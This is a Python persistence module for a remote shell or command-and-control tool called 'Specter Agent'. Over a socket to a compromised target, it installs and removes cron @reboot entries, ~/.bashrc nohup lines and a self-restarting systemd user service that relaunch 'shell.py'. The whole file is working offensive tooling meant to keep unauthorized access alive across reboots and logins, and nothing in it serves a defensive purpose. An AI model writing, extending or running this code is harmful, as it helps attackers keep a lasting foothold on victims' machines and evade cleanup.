def _cmd(sock, command):
    sock.send(command.encode())
    return sock.recv(4096).decode().strip()


def _install_crontab(sock, python_bin, shell_path):
    # Remove any existing entry for this shell, then add fresh
    cmd = (
        f'(crontab -l 2>/dev/null | grep -v "{shell_path}"; '
        f'echo "@reboot {python_bin} {shell_path}") | crontab -'
    )
    _cmd(sock, cmd)
    verify = _cmd(sock, "crontab -l")
    if shell_path in verify:
        print("[+] Crontab persistence installed (@reboot).")
    else:
        print("[-] Failed to write crontab entry.")


def _remove_crontab(sock, shell_path):
    _cmd(sock, f'(crontab -l 2>/dev/null | grep -v "{shell_path}") | crontab -')
    verify = _cmd(sock, "crontab -l")
    if shell_path not in verify:
        print("[+] Crontab entry removed.")
    else:
        print("[-] Entry still present — remove manually.")


def _install_bashrc(sock, python_bin, shell_path):
    check = _cmd(sock, f'grep -c "{shell_path}" ~/.bashrc 2>/dev/null || echo 0')
    if check.strip() not in ("0", ""):
        print("[!] Entry already in ~/.bashrc — skipping.")
        return
    _cmd(sock, f'echo "nohup {python_bin} {shell_path} &>/dev/null &" >> ~/.bashrc')
    verify = _cmd(sock, f'grep "{shell_path}" ~/.bashrc')
    if shell_path in verify:
        print("[+] Bashrc persistence installed (triggers on new login shell).")
    else:
        print("[-] Failed to write ~/.bashrc entry.")


def _remove_bashrc(sock, shell_path):
    _cmd(sock, f'sed -i "\\|{shell_path}|d" ~/.bashrc')
    verify = _cmd(sock, f'grep "{shell_path}" ~/.bashrc 2>/dev/null || echo CLEAN')
    if shell_path not in verify:
        print("[+] Bashrc entry removed.")
    else:
        print("[-] Entry still present — remove manually.")


def _install_systemd(sock, python_bin, shell_path):
    _cmd(sock, "mkdir -p ~/.config/systemd/user/")
    service = (
        "[Unit]\\n"
        "Description=Specter Agent\\n"
        "After=network.target\\n\\n"
        "[Service]\\n"
        "Type=simple\\n"
        f"ExecStart={python_bin} {shell_path}\\n"
        "Restart=always\\n"
        "RestartSec=15\\n\\n"
        "[Install]\\n"
        "WantedBy=default.target"
    )
    _cmd(sock, f'printf "{service}" > ~/.config/systemd/user/specter.service')
    _cmd(sock, "systemctl --user daemon-reload")
    _cmd(sock, "systemctl --user enable specter 2>/dev/null")
    result = _cmd(sock, "systemctl --user start specter 2>&1 && echo __OK__")
    if "__OK__" in result:
        print("[+] Systemd user service installed, enabled, and started.")
    else:
        print("[!] Service written and enabled but may not have started (no active session).")
        print(f"    Status: {result[:120]}")


def _remove_systemd(sock):
    _cmd(sock, "systemctl --user stop specter 2>/dev/null")
    _cmd(sock, "systemctl --user disable specter 2>/dev/null")
    _cmd(sock, "rm -f ~/.config/systemd/user/specter.service")
    _cmd(sock, "systemctl --user daemon-reload")
    print("[+] Systemd service removed.")


def run(client_socket):
    print("\n[=== Persistence Module ===]")
    print("  Methods:")
    print("  [1] Crontab  — runs shell.py on every reboot (no root needed)")
    print("  [2] Bashrc   — runs shell.py on every new login shell")
    print("  [3] Systemd  — user service, auto-restarts if killed")
    print("  Remove:")
    print("  [4] Remove crontab entry")
    print("  [5] Remove bashrc entry")
    print("  [6] Remove systemd service")
    print("  [0] Cancel")

    choice = input("\n[?] Select: ").strip()

    if choice == "0":
        print("[*] Cancelled.")
        print("[==========================]\n")
        return

    if choice in ("4", "5", "6"):
        if choice == "4":
            path = input("[?] Path to shell.py on target: ").strip()
            _remove_crontab(client_socket, path)
        elif choice == "5":
            path = input("[?] Path to shell.py on target: ").strip()
            _remove_bashrc(client_socket, path)
        elif choice == "6":
            _remove_systemd(client_socket)
        print("[==========================]\n")
        return

    shell_path = input("[?] Full path to shell.py on target: ").strip()

    # Detect python binary on target
    py = _cmd(client_socket, "which python3 2>/dev/null || which python 2>/dev/null")
    python_bin = py.split("\n")[0].strip() or "python3"
    print(f"[*] Using {python_bin} on target")

    if choice == "1":
        _install_crontab(client_socket, python_bin, shell_path)
    elif choice == "2":
        _install_bashrc(client_socket, python_bin, shell_path)
    elif choice == "3":
        _install_systemd(client_socket, python_bin, shell_path)
    else:
        print("[-] Invalid choice.")

    print("[==========================]\n")
